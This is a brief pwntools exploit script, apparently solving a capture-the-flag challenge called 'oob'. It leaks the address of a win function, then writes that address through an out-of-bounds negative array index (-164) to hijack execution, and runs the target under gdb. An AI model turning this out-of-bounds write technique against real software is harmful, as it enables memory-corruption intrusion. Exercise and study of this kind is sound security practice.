#!/usr/bin/python3
from pwn import *

exe = ELF('./oob')

p = process(exe.path)
p = gdb.debug(exe.path,'''
              
              b* main+ 424
              c
              info files
              ''')

p.sendlineafter('choice: ',b'2')
p.recvuntil("is at address: ")
win_address = int(p.recvuntil('"',drop = True),16)
log.info ('win address : '+ hex(win_address))


p.sendlineafter('choice: ',b'1')
p.sendlineafter('index:',b'-164')  #-656/4
p.sendlineafter('value: ',str((win_address)))


p.interactive()
#0x56